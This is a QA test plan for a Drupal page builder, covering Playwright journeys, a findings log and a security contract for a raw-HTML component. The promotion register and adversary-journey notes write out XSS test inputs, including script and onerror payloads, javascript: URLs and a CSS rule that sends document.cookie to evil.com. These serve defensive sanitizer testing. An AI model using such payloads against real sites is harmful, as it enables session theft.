| S0.4.3 | Add 5 testability hooks to `BuilderApp.tsx` (mosaic-can-undo, mosaic-can-redo, mosaic-component-count, mosaic-preview-state, mosaic-save-state) | `js/src/builder/BuilderApp.tsx` + bundle rebuild |
| S0.4.4 | Fix FINDING-001: replace 6 `waitForTimeout(300)` with `expect(locator[data-testid="mosaic-can-undo"]).toHaveAttribute('data-state', 'true')` | `uat-100-scenarios.spec.ts`, `uat-builder-journey.spec.ts` |
| S0.4.5 | Update `scripts/qa/e2e-setup.sh`: add `IS_DDEV_PROJECT` env guard (FINDING-007, hard `exit 1`), then enable `jsonapi` + `basic_auth`, create `mosaic_qa_api` Drupal user, toggle JSON:API write mode | `scripts/qa/e2e-setup.sh` |
| S0.4.6 | Create `helpers/json-api.ts`: createJourneyNode, deleteNodeByUuid | `helpers/json-api.ts` |
| S0.4.7 | Create `fixtures/components.ts` + `fixtures/invalid.ts` per §4 | `fixtures/` |
| S0.4.8 | Create `pages/FrontendPage.ts` + extend `BuilderPage.ts` with new methods | `pages/` |
| S0.4.9 | Bump `@playwright/test` to `^1.61.1` in `package.json` | `package.json` |
| S0.4.10 | `npm run verify` green with all new files in scope | — |

| S0.4.11 | Fix FINDING-005 (B-089): `mosaic_heading` renders `<div>` not `<h2>` — fix `MosaicPuckAdapter.toConfig()` to supply `defaultProps` from PHP field defaults | `src/Plugin/Puck/Adapter/MosaicPuckAdapter.php` |

**S0.4 done when:** `npm run verify` exits 0; testability hooks in live DDEV DOM; old suite 127/127 still green; FINDING-001 resolved (no waitForTimeout in gate files); FINDING-005 fixed and verified — `mosaic_heading` renders `<h2>` after drag with no save required.

### S1 — Journeys J1 + J2 (T.1 RC3 Sweep)

**Goal:** First two journeys green against shipped code. Every failure = FINDING in §8.

| Story | Description |
|---|---|
| S1.1 | Write J1 (First Contact): fresh content type → field → builder loads |
| S1.2 | Write J2 (Author Page): full accumulating-node lifecycle, 18 components |
| S1.3 | Run J1+J2 against shipped code UNTOUCHED — record every failure as FINDING |
| S1.4 | Fix each FINDING (or accept with Arun's explicit approval) |
| S1.5 | J1+J2 green twice consecutively |

**S1 done when:** J1 + J2 green ×2 consecutively; all FINDINGs resolved or Arun-accepted.
This is T.1.4 from the roadmap — the RC3 sweep completion gate.

### S2 — Journeys J3–J5 + Pairwise Breadth

| Story | Description |
|---|---|
| S2.1 | J3: Templates (save / browse / load / independence check) |
| S2.2 | J4: Live Data + access-check security assertions |
| S2.3 | J5: Design Tokens (computedStyle cascade) |
| S2.4 | Pairwise breadth tests (§3.5) — field-value class × validation path pairs |
| S2.5 | Sub-module interop: mosaic_search + mosaic_webform mini-journeys |

### S3 — Journeys J6–J10 + T.3 Supporting Layers

| Story | Description |
|---|---|
| S3.1 | J6: Editorial lifecycle (Content Moderation, draft/published, revisions) |
| S3.2 | J7: Breakpoints (per-breakpoint override verification) |
| S3.3 | J8: Accessibility (axe × all components, WCAG 2.2 new criteria, FINDING-004) |
| S3.4 | J9: Schema migration (migrateInstance round-trip) |
| S3.5 | J10: Adversary / abuse (SSRF, field access, malformed JSON, CSRF bypass) |
| S3.6 | T.3.1 PHPUnit Kernel/Unit gates (schema validation, access checks, cache tags) |
| S3.7 | T.3.2 Render-contract checks (JSON-LD, LCP image, no console errors) |
| S3.8 | T.3.3 Static CI gates wired (PHPStan L6, PHPCS, `tsc`, eslint, fixture validation) |

**Phase complete when:** All 10 journeys + supporting layers green ×2 consecutively;
findings log empty or Arun-accepted; TEST-TODO.md + memory match reality.

### AI Journey (Epic 1-gated)

Write J-AI (AI generation journey) with mocked provider now; mark `SPEC-PENDING`.
Tests flip from skip → active when `mosaic_intelligence` ships Epic 1.

---

## 6. Run-Tier Strategy

### Tier 1 — PR Smoke Gate (`@smoke`)

**When:** Every MR, every push. Must complete in ≤10 minutes.
**Contents:** 10–15 tests tagged `@smoke` covering the most critical paths:
- J1 complete (install → builder loads)
- J2: one component (mosaic_heading) full lifecycle — drag, fill, save, frontend verify, Twig-first check
- One negative: blank required field → blocked
- One anonymous access check
- `npm run verify` (tsc + eslint)

```bash
# CI command
npx playwright test --grep @smoke --workers=1
```

**Why not more:** PR smoke is a confidence check, not a regression suite. A 10-minute gate
with 100% pass rate is more valuable than a 40-minute gate that developers learn to ignore.

### Tier 2 — Nightly Full Sweep

**When:** Nightly, on the main branch. Can run for 2–4 hours.
**Contents:** All J1–J10 + pairwise breadth + sub-module interop. All 18 component journeys.

```bash
# CI command (4-shard parallel; pixel tests excluded — see §2.5)
npx playwright test --shard=$SHARD_INDEX/4 --grep-invert @pixel --workers=1 --reporter=blob
# then merge:
npx playwright merge-reports --reporter html ./blobs
```

**GitHub Actions structure:**
- `fail-fast: false` in matrix — one shard failure does not cancel others
- `retries: 0` everywhere — see policy below

**Retries policy (`retries: 0` everywhere, no exceptions):**
`retries: 1` masks flakes and directly conflicts with the oracle rule. A flaky test is either:
(a) a race condition in the product → a FINDING; or (b) a bad assertion that depends on timing
→ a code defect in the test itself. Neither is fixed by retrying; both are hidden by it. The
original §6 had `retries: 1` for non-journey tests "for transient network hiccups" — that
rationale is rejected: our test environment is local DDEV, not a flaky remote network. Any test
that fails intermittently gets recorded as FINDING-NNN ("flaky: reproduce and diagnose") before
it is fixed. `retries: 0` in `playwright.config.ts` with no per-project override.

### Tier 3 — Weekly Full Suite + Static Gates

**When:** Weekly (Sunday), and before any release consideration.
**Contents:** Nightly + PHPUnit 2801 tests + PHPCS + PHPStan level 6.
The "sweep green twice consecutively" check (directive §10) is at this tier.

### Local Development

```bash
# Run a specific journey
npx playwright test e2e/journeys/J2-author-page.spec.ts

# Run old suite (regression net)
npx playwright test e2e/uat-100-scenarios.spec.ts e2e/uat-builder-journey.spec.ts

# Run smoke tags only (fast local verification)
npx playwright test --grep @smoke

# Show UI for debugging
npx playwright test --ui
```

---

## 7. Promotion Register

Each entry carries: the axis pair, the mechanism hypothesis, and the fault history.
Any fault found → escalate that subset one level deeper.

| ID | Pair | Mechanism hypothesis | Fault history |
|---|---|---|---|
| PR-001 | **Escaped-context** components × XSS string (`mosaic_heading`, `mosaic_text`, `mosaic_card`, `mosaic_button`) | Text stored as JSON string, rendered via Twig `{{ text }}` with auto-escape; oracle: attack string renders as visible literal text, is NOT executed, `document.cookie` is NOT modified | No fault found yet |
| PR-002 | `mosaic_button.url` × `javascript:` scheme | URL stored as string, emitted as `href` attribute; Drupal's `Url::fromUri()` rejects `javascript:` — but only if the code uses that API | No fault found yet |
| PR-003 | mosaic_live_search.endpoint × SSRF internal address | Endpoint URL is sent to a server-side resolver; if the allow-list is enforced client-side only, SSRF via POST to `/api/mosaic/resolve` is possible | Oracle expectation: 403 or blocked |
| PR-004 | mosaic_carousel (Tier B) × mobile breakpoint | Carousel SSR returns empty HTML for zero slides; mobile breakpoint has different CSS for the SSR wrapper; loading skeleton may overflow on 393px | Pre-existing failure class (B-090 area) |
| PR-005 | mosaic_columns (slots) × accumulated regression | When columns component holds child components, accumulation check must traverse slot content; slot rendering may differ between admin/anonymous | No fault found yet |
| PR-006 | restricted component (mosaic_html) × `editor` role | HTML component has `restricted: true`; editor role must not see it in palette; prop-panel must not be accessible | Security assertion — J4 scope |
| PR-007 | `mosaic_image.alt` × blank string | Blank alt submitted → Drupal field validation → should block save; if not blocked → WCAG 1.1.1 violation on frontend | FINDING-004 scope |
| PR-008 | webform_embed.webform_id × nonexistent ID | SDC render with bad entity ref → Drupal may throw exception, render blank, or show placeholder; spec must define expected behavior | Oracle: graceful empty state, no 500 |
| PR-009 | mosaic_heading.level × first-drag default | B-089: heading renders `<div>` not `<h2>` on first drag (no defaultProps applied). Frontend HTML check will catch this. | Open bug B-089 |
| PR-010 | draft node × anonymous user | Draft layout edit MUST NOT be visible to anonymous (editorial lifecycle test J6) | Security assertion |

#### mosaic_html Security Contract (Correction 3)

> **CORRECTION (2026-07-10):** The original PR-001 applied "XSS renders inert" to all components
> including mosaic_html. That is the WRONG oracle. mosaic_html's entire purpose is rendering raw
> HTML — "XSS renders inert" means the component can't do its job. mosaic_html needs an explicit
> **security contract**: a stated allowed-tag/attribute policy, and assertions that the actual
> rendered output matches that policy exactly.
>
> **Pre-condition for J10 implementation:** The mosaic_html component schema or documentation
> must explicitly state its allowed-tag policy. If no policy is documented, that IS the first
> J10 finding: "security contract undefined — spec gap." Tests are written against the documented
> policy, not guessed from observed behavior (oracle rule §3).

Assumed policy (verify against actual mosaic_html code before J10 runs):
- Allowed: structural and semantic HTML (`<p>`, `<ul>`, `<li>`, `<a href>`, `<strong>`, `<em>`, `<table>`, headings)
- BLOCKED: `<script>` (any form, including `<SCRIPT>`, `<scRIPt>`, encoded variants)
- BLOCKED: event handler attributes (`onerror`, `onload`, `onclick`, `onmouseover`, any `on*`)
- BLOCKED: `javascript:` URL scheme in `href` and `src` attributes
- BLOCKED: `<iframe>`, `<embed>`, `<object>`, `<form>` (injection vectors)
- BLOCKED: `<style>` with CSS injection (`:hover { background: url(...) }`)
- ALLOWED with restriction: `<a href>` only for `http:`, `https:`, `/` prefixed paths

Each blocked category is a separate promotion entry with its own oracle test:

| ID | Pair | Mechanism hypothesis | Oracle expectation |
|---|---|---|---|
| PR-011 | `mosaic_html.content` × `<script>` tag | Drupal text format sanitizer must strip `<script>` before persist; if admin saves `<script>` → render must contain no `<script>` in page source | `page.content()` must not contain `<script>` (case-insensitive) |
| PR-012 | `mosaic_html.content` × `onerror` event handler | `<img src=x onerror=alert(1)>` — event handler must be stripped by sanitizer; alt: `src=x` renders as broken image with no alert | No `onerror` attribute in DOM; no `alert()` called (track via `dialog` event listener = 0) |
| PR-013 | `mosaic_html.content` × `javascript:` URL | `<a href="javascript:void(0)">` and `<a href="javascript:document.cookie">` — href must be sanitized to `#` or stripped | No `javascript:` scheme in any `href` or `src` in DOM |
| PR-014 | `mosaic_html.content` × `<iframe>` embed | `<iframe src="https://evil.com">` — element must be stripped or escaped | No `<iframe>` in rendered output |
| PR-015 | `mosaic_html.content` × CSS injection in `<style>` | `<style>.x { background: url('https://evil.com?data='+document.cookie) }</style>` | No `<style>` tag in rendered output; no network request to crafted URL |

**mosaic_html J10 scope:** Each PR-011–PR-015 entry is one test in J10. Plus:
- PR-016 (added): `mosaic_html.content` × valid HTML → oracle: allowed tags render correctly, no stripping of `<p>`, `<a>`, `<strong>` (positive contract assertion, not just negative)
- PR-017 (added): `mosaic_html.content` × Drupal text format boundary → oracle: the specific Drupal text format assigned to mosaic_html's field matches the expected sanitizer; if the format is "full_html", the allowed-tag policy matches "full_html"'s actual filter configuration

Total new J10 sub-tests from mosaic_html contract: 7 (PR-011 through PR-017)

**Escalation rule:** Any PR entry that produces a real fault in testing → add a full parametric
sweep of that dimension (e.g., if PR-003 finds an SSRF bypass, add 8 distinct SSRF payload tests).
If PR-011 finds that `<script>` is NOT stripped, escalate to full XSS payload matrix (8+ vectors).

---

## 8. Findings Log

All test-suite findings (oracle rule §3: spec is truth, not current site behavior).
Each finding must be resolved or Arun-accepted before the phase is considered done.

---

### FINDING-001: 6 `waitForTimeout` violations in gated spec files

**Severity:** Hard gate violation (eslint `playwright/no-wait-for-timeout: error`)
**Status:** `OPEN`
**Files:**
- `js/e2e/uat-100-scenarios.spec.ts`: Q-001, Q-002, Q-003, Q-004 (4 calls)
- `js/e2e/uat-builder-journey.spec.ts`: J-UR-001, J-UR-002 (2 calls)

**Root cause:** Puck's `createHistorySlice.record()` is debounced 250ms (confirmed in
`chunk-mosaic-vendor-puck.js`). After `mouse.up()`, history is not committed for 250ms.
`keyboard.press('Control+z')` before the timer fires is a no-op (`history.hasPast()` = false).
Workaround applied in Sprint 104: `waitForTimeout(300)`.

**Spec requirement (T.0.1):** "No `waitForTimeout` anywhere, ever."

**Required fix:** Add `data-testid="mosaic-can-undo"` attribute to `BuilderApp.tsx` bound to
Puck appState's history — `data-state="true"` when `hasPast()` is true, `data-state="false"`
otherwise. Replace all 6 calls with:
```typescript
// BEFORE (violates T.0.1):
await page.waitForTimeout(300);
await page.keyboard.press('Control+z');

// AFTER (web-first, oracle-safe):
await expect(page.locator('[data-testid="mosaic-can-undo"]'))
  .toHaveAttribute('data-state', 'true', { timeout: 2_000 });
await page.keyboard.press('Control+z');
```
This is zero-sleep and provably correct: the assertion passes exactly when the history is
committed, regardless of system speed. Covered by S0.4 story S0.4.3 + S0.4.4.

---

### FINDING-002: `@playwright/test` version is behind

**Severity:** Medium (missing APIs; toMatchAriaSnapshot requires ≥v1.49)
**Status:** `OPEN`
**File:** `js/package.json`
**Current:** `"@playwright/test": "^1.50.0"` (installed version may resolve to any 1.5x)
**Latest stable:** `1.61.1` (released 2026-06-23)

**Required fix:** Bump to `"@playwright/test": "^1.61.1"` and run `npm install`.
Covered by S0.4 story S0.4.9.

---

### FINDING-003: Puck is one minor version behind (0.21.2 vs 0.22.0)

**Severity:** Low / Informational (no known breaking change confirmed)
**Status:** `OPEN` — verify before building new suite
**Source:** GitHub API confirmed Puck 0.22.0 released 2026-06-23.

**Required action:** Read Puck 0.22.0 changelog at github.com/measuredco/puck/releases/tag/v0.22.0.
Check for breaking changes to: drag sensor API, action bar, history API, `monitorHotkeys`,
`resolveData`. If breaking changes exist → Mosaic's `chunk-mosaic-vendor-puck.js` is already
0.21.2 and will not be affected until a deliberate bundle rebuild. BUT: `page.mouse.*` drag
and history debounce assumptions in the test suite are specific to 0.21.2. Document what changes.
S0.4.2 covers this.

---

### FINDING-004: WCAG 2.5.7 Dragging Movements — OPEN VIOLATION

**Severity:** High (AA conformance; blocks gov/enterprise adoption per roadmap §3)
**Status:** `OPEN — REQUIRES ARUN ACCEPTANCE TO NOT BLOCK PHASE GATE`
**Spec:** WCAG 2.5.7 — VERIFIED: "All functionality that uses dragging movements can be achieved by another pointer input modality." (w3.org/TR/WCAG22, §1.7)

**Current state:** Puck 0.21.2 does not wire dnd-kit's `KeyboardSensor`. No keyboard pathway
exists to add a component to the Mosaic canvas. The Playwright WCAG spike (`wcag-keyboard-drag.spec.ts`)
confirmed this — marked `test.fail()` to preserve the oracle finding.

**Impact:** Every government and most enterprise clients require WCAG 2.2 AA compliance.
This is a show-stopper for the "gov/enterprise niche" market positioning.

**J8 test scope:** J8-008 is written and uses `test.fixme()` (not `test.fail()`):
- `test.fail()` passes when the test fails and fails when it passes — fragile and confusing.
- `test.fixme()` marks the test as expected-to-fail and SKIPS it, so J8 is never permanently
  red from this known issue. It flips from skip → active when Epic 6.4 ships.

```typescript
test.fixme('J8-008: keyboard-only pathway adds a component (WCAG 2.5.7)', async ({ page }) => {
  // SPEC-PENDING: Epic 6.4 (Keyboard/a11y parity) not yet shipped.
  // This test will skip until the epic lands. Remove fixme when KeyboardSensor is wired.
  // When active: focus the Mosaic palette, Tab/Enter/arrow-key to add a component,
  // assert component count increments and the component appears in the canvas.
});
```

**Phase gate impact:** Directive §10 requires the findings log empty OR Arun-accepted before
the phase is done. FINDING-004 cannot be fixed in this phase (it requires Epic 6.4). Therefore:
**Arun must explicitly accept FINDING-004 to allow the phase gate to close without it.**
This is recorded in the findings log as a required policy decision. The J8 test is `test.fixme` —
J8 is not permanently red, and the phase gate is not blocked provided Arun accepts the finding.

---

### FINDING-005: B-089 — mosaic_heading renders `<div>` not `<h2>` on first drag

**Severity:** High (breaks Twig-first HTML check; wrong semantic HTML)
**Status:** `OPEN` — documented Sprint 103; no fix committed
**Oracle rule:** Spec says `tag_prop: level` default `h2`. Rendered output must be `<h2>`.

**J2 impact:** The Twig-first HTML check `expect(html).toContain('<h2>')` WILL FAIL for
`mosaic_heading` until B-089 is fixed. This is an oracle finding — do not adjust the assertion.
The fix location: `MosaicPuckAdapter.toConfig()` must supply `defaultProps` from PHP field defaults.

---

### FINDING-006: `mosaic_meta` has no visual canvas representation

**Severity:** Informational (expected behavior, not a bug — but test must account for it)
**Status:** `ACCEPTED` (by nature of the component)

`mosaic_meta` injects into `<head>` via hooks, not into the canvas visual output. The Master
Journey §4 step "Verify component on frontend" must assert `<head>` tags, not `.mosaic-meta`
in the DOM. The `assertComponentRenders()` method in `FrontendPage` must have a special code
path for `mosaic_meta` → `expect(page.locator('head title')).toHaveText(fixture.title)`.

---

### FINDING-007: `e2e-setup.sh` has no environment guard

**Severity:** High — security misconfiguration risk
**Status:** `OPEN` (Correction 4)
**File:** `scripts/qa/e2e-setup.sh` (committed to repo — not gitignored)

**Risk:** The script enables JSON:API write mode, enables `basic_auth`, and creates
`mosaic_qa_api` with `create/delete mosaic_qa content` permissions. If run by mistake on a
staging or production DDEV site (e.g., in CI with a wrong env variable, or a developer
running the script against the wrong profile), it creates a permanently-enabled HTTP write
API with a privileged account. This is a publicly-accessible security hole until manually
reversed.

**Required fix:** Add a hard environment guard at the top of `scripts/qa/e2e-setup.sh`,
immediately after the shebang and `set -euo pipefail`. `MOSAIC_QA_ENV_OVERRIDE` is kept as
an escape hatch for non-DDEV CI, but must produce a loud warning and a 5-second TTY countdown
so an engineer running interactively cannot accidentally confirm without seeing it:

```bash
#!/usr/bin/env bash
set -euo pipefail

# ────────────────────────────────────────────────────────────────────
# ENVIRONMENT GUARD — REFUSE TO RUN OUTSIDE A LOCAL/TEST ENVIRONMENT
# This script enables JSON:API write mode and creates a privileged API user.
# Running it on a staging or production site creates a public security hole.
# ────────────────────────────────────────────────────────────────────
if [[ -z "${IS_DDEV_PROJECT:-}" ]]; then
  if [[ -z "${MOSAIC_QA_ENV_OVERRIDE:-}" ]]; then
    echo "FATAL: e2e-setup.sh must only run inside DDEV (IS_DDEV_PROJECT is unset)" >&2
    echo "       or with MOSAIC_QA_ENV_OVERRIDE=1 explicitly set." >&2
    echo "" >&2
    echo "       This script enables JSON:API write mode and creates mosaic_qa_api" >&2
    echo "       with create/delete permissions — a publicly-accessible write API." >&2
    exit 1
  else
    # Override path: loud warning + TTY countdown so non-DDEV CI must be intentional.
    echo "WARNING: IS_DDEV_PROJECT is unset. MOSAIC_QA_ENV_OVERRIDE is set." >&2
    echo "         This script will enable JSON:API write mode on the current site." >&2
    echo "         Ensure this is a disposable test environment, not staging/production." >&2
    if [[ -t 0 ]]; then
      # stdin is a TTY — require a human to see and wait through the countdown
      echo "         Proceeding in 5 seconds. Ctrl+C to abort." >&2
      sleep 5
    fi
  fi
fi
echo "INFO: Environment guard passed (IS_DDEV_PROJECT=${IS_DDEV_PROJECT:-UNSET} / OVERRIDE=${MOSAIC_QA_ENV_OVERRIDE:-UNSET})"
```

`IS_DDEV_PROJECT` is automatically set by DDEV in the web container and inherited by shell
sessions. No additional configuration needed for normal DDEV use.

**Covered by:** S0.4 story S0.4.5 (update `scripts/qa/e2e-setup.sh`).

---

### FINDING-008: Pre-save preview behavior undocumented for Tier A components (spec gap)

**Severity:** Low / Informational (spec gap, not a product bug)
**Status:** `OPEN` — spec gap logged as required by Oracle Rule §3
**Directive reference:** §6.2 "the known behavior (preview not functional before first save)
is SPEC'D and ASSERTED"

**Current state:** The spec documents that "full preview is not available before first save."
For Tier B (SSR) components, the loading skeleton is the spec'd pre-save state (confirmed:
`[data-testid="mosaic-preview-state"]` data-state="loading"). For Tier A (Twig) components,
the expected pre-save canvas state is not documented — it may be an immediate Twig render, an
empty placeholder, or something else. `BuilderPage.assertPreviewBehavior()` cannot assert
Tier A's pre-save state without a documented oracle.

**Required action:** Before building S1, read the mosaic_components SDC component definitions
for Tier A components (e.g., `mosaic_heading`, `mosaic_text`) and document: what does the
canvas show immediately after drag, before save? Add the answer as the Tier A clause in
`BuilderPage.assertPreviewBehavior()`. This is a research + documentation task, not a code fix.

**Covered by:** S0.4.2 scope (environment research before build starts).

---

### FINDING-025: Nested slot zones unreachable by CDP synthetic pointer drags

**Severity:** High (blocks P07 of J2; slot drag-UX coverage cannot be automated via pointer events)
**Status:** `ACCEPTED — MANUAL REPRODUCTION ONLY` (Arun ruling, 2026-07-12)
**File:** `js/e2e/journeys/J2-lifecycle.spec.ts` — `dragToSlot()` helper

**Root cause:** CDP synthetic pointer events (`page.mouse.move/down/up`) cannot target nested
slot DropZones in dnd-kit's collision detection. Three variants eliminated:
- No-wait baseline: items route to root canvas
- 300ms static wait after mouse.down: items route to root canvas
- ±2px jiggle (6 pulses, no waitForTimeout): items route to root canvas with different root
  insertion index (proving collision engine processes the events) but slot zone never wins

**Observation from jiggle run:** movement events DO alter root canvas insertion index (the
collision engine registers them), but the slot zone boundary is never crossed in synthetic
mode. This distinguishes "collision not happening" from "wrong zone winning." Zone boundary
crossing requires a real pointer device or programmatic store access.

**Manual verification (Arun, 2026-07-12):** Real-user drag of `mosaic_text` into
`mosaic_columns` `column_1` works correctly: text lands IN the column, survives save, survives
edit-reload, renders correctly on the anonymous frontend. Product is NOT broken.
**This is a TEST-SIMULATION DEFECT, not a product defect.**

**FINDING-024 relationship:** FINDING-024 was originally filed as "Puck 0.21.3 slot routing
defect." Arun's manual reproduction refuted this. FINDING-024 was reclassified as
TEST-SIMULATION DEFECT and is now closed. FINDING-025 is the permanent record of the
root cause: CDP synthetic events, not Puck's slot routing.

**Resolution path:** FINDING-025 is the reason Option D (programmatic insert via Puck's
internal dispatch) was ratified. See J2 P07 fill function implementation. Slot drag-UX
coverage formally assigned to manual human reproduction (Arun, on record).

**Standing lesson (Arun ruling):** BEFORE any upstream bug report or product-defect
classification of interactive behavior, a MANUAL human reproduction is MANDATORY. Synthetic
events are inadmissible as sole evidence for product defects.

---

## 9. Old Suite Disposition

Current spec files are the **regression net** while the new suite is built.
Per directive §9: "retire per area, never big-bang delete, never polish the retiring code."

| Old spec file | Retire when new suite covers |
|---|---|
| `uat-100-scenarios.spec.ts` | J2 complete (all 18 component lifecycle tests green ×2) |
| `uat-builder-journey.spec.ts` | J2 + J7 (breakpoints) + J6 (editorial lifecycle) green ×2 |
| `builder.spec.ts` | J1 (first contact) green ×2 |
| `frontend-editor.spec.ts` | J2 (frontend render + Twig-first) green ×2 |
| `templates.spec.ts` + `templates-advanced.spec.ts` | J3 (templates) green ×2 |
| `breakpoints.spec.ts` | J7 (breakpoints) green ×2 |
| `design-tokens.spec.ts` | J5 (design tokens) green ×2 |
| `access.spec.ts` | J10 (adversary) green ×2 |
| `lock.spec.ts` | J6 (editorial lifecycle) green ×2 |
| `lit-components.spec.ts` | J2 (mosaic_tabs + mosaic_carousel Lit journeys) green ×2 |
| `uat-phase0.spec.ts` | J1 (first contact + builder shell) green ×2 |
| `wcag-keyboard-drag.spec.ts` | J8 (accessibility) green ×2 — only after FINDING-004 fixed |
| `mosaic-diag.spec.ts` | Delete immediately (diagnostic file, never a gate) |
| `admin-builder-canvas.spec.ts` | J2 (canvas visual assertions) green ×2 |
| `column-layout.spec.ts` | J2 (mosaic_columns slot lifecycle) green ×2 |

---

## 10. Six Hats Notes

One line per hat per major suite area. Per directive §8.

### J2 — Author Page (core journey)

| Hat | Note |
|---|---|
| QA Architect | Accumulating-node structure exercises regression-by-accumulation — the most valuable coverage pattern for a composable builder |
| Sr QA | Manual replication: open node edit, drag heading, type text, save, view anonymously as `incognito` — verdict must match test verdict |
| PM | J2 smoke tag (`@smoke`) runs on every MR; full 18-component run is nightly; total PR gate time: ≤10 min |
| Product Owner | Proves Mosaic's core promise: "content you type in the builder appears in the initial Twig HTML" — the no-JS fetch check is the machine-enforceable version of that promise |
| Dev Architect | Requires 5 `data-testid` hooks in BuilderApp.tsx + JSON:API write mode enabled + `mosaic_qa_api` Drupal user; all listed in S0.4 |
| Sr Developer | Page objects: `BuilderPage.fillAllProps()` + `FrontendPage.assertComponentRenders()` eliminate all inline locator strings from test bodies; strict TS throughout |

### J10 — Adversary (expanded for mosaic_html security contract)

| Hat | Note |
|---|---|
| QA Architect | Security assertions are oracle findings by definition; "XSS renders inert" was the wrong oracle for mosaic_html — the contract is the ALLOWED-TAG POLICY, not a blanket "nothing harmful." PR-011–PR-017 each assert a different clause of that policy |
| Sr QA | Manual replication: paste `<script>alert(1)</script>` into mosaic_html prop panel, save, view published page, open browser console — no alert should fire; must also verify `<a href="javascript:">` is stripped |
| PM | J10 is nightly-only; mosaic_html sub-tests tagged `@security @mosaic-html` for targeted re-runs when the HTML sanitizer config changes |
| Product Owner | J10's mosaic_html contract proves Mosaic is safe for content editor roles on sites with user-generated content pipelines — the security contract is a selling point, not just a gate |
| Dev Architect | The mosaic_html security contract requires knowing the exact Drupal text format assigned to the component field; a test must assert `format === 'the_expected_format_machine_name'` not just behavioral output |
| Sr Developer | Use Playwright's `page.locator(':has(script)')` to assert no script tags in DOM; use `page.on('dialog', () => fail('alert fired'))` to catch unhandled alerts; use `request.fetch()` to inspect raw response HTML (not browser-rendered DOM which may strip script tags before you assert) |

### J8 — Accessibility

| Hat | Note |
|---|---|
| QA Architect | axe component-scoped scan + full-page scan per component = defense in depth; aria snapshots provide structure, axe provides rule compliance |
| Sr QA | Manual check: run NVDA + Chrome on the published page; tab through every component; verdict must align with axe findings |
| PM | A11y findings are gating for gov clients — must appear in the PR report, not just nightly |
| Product Owner | WCAG 2.2 AA compliance is a procurement checkbox for every government RFP; FINDING-004 (2.5.7) blocks this until Epic 6.4 |
| Dev Architect | `disableRules(['color-contrast'])` only for known design-system false positives that are tracked — never to hide real violations; each disabled rule needs a one-line justification |
| Sr Developer | `@axe-core/playwright` v4.12.1 API is now verified (§1.7): `new AxeBuilder({ page }).include(sel).withTags(['wcag2aa','wcag22aa']).disableRules(rule).analyze()` — do not diverge from this signature |

### Pairwise Breadth

| Hat | Note |
|---|---|
| QA Architect | Pairwise targets fault density: field validation × role × field type; not random, not exhaustive — engineered |
| Sr QA | Each pairwise case must have a clear expected outcome stated as the first line of the test: "Given an XSS string in the heading text field, the rendered output must not execute the script" |
| PM | Pairwise runs nightly, not on PR smoke; results feed the Promotion Register |
| Product Owner | Pairwise is how we prove ACSF-safe: if the suite was only happy-path, field-length overflows and unicode breaks would ship to production |
| Dev Architect | Fixture file `fixtures/pairwise/field-value-pairs.ts` is the single source of curated pairs; no inline data in test files |
| Sr Developer | `.forEach()` over ATTACK_FIXTURES array generates the test suite at suite definition time — `npm run verify` sees the full set; no dynamic test generation that bypasses tsc |

---

## 11. Honesty Ledger

| Claim | Status | Action |
|---|---|---|
| Playwright 1.61.1 is current stable | ✅ VERIFIED — GitHub API | None |
| `toMatchAriaSnapshot()` introduced v1.49 | ✅ VERIFIED — release notes | None |
| `test.describe.serial()` not recommended by Playwright | ✅ VERIFIED — playwright.dev docs | Rejected for ALL uses including J2 — see §1.9 and round-3 CORRECTION entry |
| Nightwatch being replaced by Playwright in Drupal core | ✅ VERIFIED — drupal.org/issues/3467492 + 3553673 | None |
| JSON:API not enabled by default in Drupal 11 standard profile | ✅ VERIFIED — standard.info.yml on GitLab | Must enable in QA setup script |
| JSON:API write mode disabled by default | ✅ VERIFIED — Drupal docs | Must enable in QA setup script |
| Basic Auth bypasses CSRF for JSON:API | ✅ VERIFIED — drupal.org/issues/3055260 | None |
| DDEV supports multiple named databases | ✅ VERIFIED — docs.ddev.com | Not adopted (see §1.3) |
| SQLite-per-worker DDEV pattern exists (Lullabot) | ✅ VERIFIED — lullabot.github.io/playwright-drupal | Not adopted (MariaDB fidelity) |
| Worker reuse bug in per-worker DB isolation | ✅ VERIFIED — drupal.org/project/canvas/issues/3554549 | Informed decision to use per-test isolation |
| Puck v0.22.0 released 2026-06-23 | ✅ VERIFIED — GitHub package.json | FINDING-003: verify changelog |
| Puck uses Jest 29 + @testing-library/react 16, no Playwright | ✅ VERIFIED — packages/core/package.json | Mosaic owns its own drag E2E |
| `test.for()` does not exist in Playwright | ✅ VERIFIED — docs fetched, not present | Use `.forEach()` |
| `@axe-core/playwright` current version | ✅ VERIFIED — npm registry live — v4.12.1 | None |
| `@axe-core/playwright` API: `new AxeBuilder({ page })` constructor | ✅ VERIFIED — axe-core-npm README (GitHub live) | None |
| `@axe-core/playwright` method: `.include(selector)` | ✅ VERIFIED — README | None |
| `@axe-core/playwright` method: `.withTags(['wcag22aa'])` | ✅ VERIFIED — README + rule descriptions page | wcag22aa rules are disabled by default; must be explicit |
| `@axe-core/playwright` method: `.disableRules(rule)` | ✅ VERIFIED — README | None |
| WCAG 2.2 criterion 2.5.7 (Dragging Movements) exact text | ✅ VERIFIED — w3.org/TR/WCAG22 live | "All functionality that uses dragging movements can be achieved by another pointer input modality." |
| WCAG 2.2 criterion 2.5.8 (Target Size 24×24px) exact text | ✅ VERIFIED — w3.org/TR/WCAG22 live | "The target size for pointer inputs is at least 24 by 24 CSS pixels" |
| WCAG 2.2 published October 5, 2023 | ✅ VERIFIED | 9 new SCs; 4.1.1 removed |
| Section 508 references WCAG 2.0 (not 2.1 or 2.2) | ✅ VERIFIED — access-board.gov/ict/ live | No active rulemaking to update the reference |
| NIST ACTS version 3.3, last updated June 2026 | ✅ VERIFIED — csrc.nist.gov live | Java-based; email acts@nist.gov to obtain |
| `pict-node` v1.3.2 (July 2024) is the verified JS pairwise tool | ✅ VERIFIED — npmjs.com + GitHub live | `allpairs` npm = 404 (does not exist); `pairwise` npm = array-pair utility only |
| Drupal Experience Builder uses Drush + test-site.php (not JSON:API) | ✅ VERIFIED — git.drupalcode.org/project/experience_builder DrupalSite.ts live | Not adopted; our JSON:API + MariaDB approach is different by design |
| `@drupal/playwright` official package exists (August 2025) | ✅ VERIFIED — git.drupalcode.org/project/playwright README live | Not adopted; requires SQLite per-test install incompatible with our live-MariaDB site |
| Playwright "setup project with dependencies" is canonical auth pattern | ✅ VERIFIED — playwright.dev/docs/auth live | Our existing `auth.setup.ts` + `dependencies: ['setup']` is correct |
| Drupal session cookie is named `SESS<hash>` | ✅ VERIFIED — drupal.org forum + storageState captures it automatically | No code change needed |
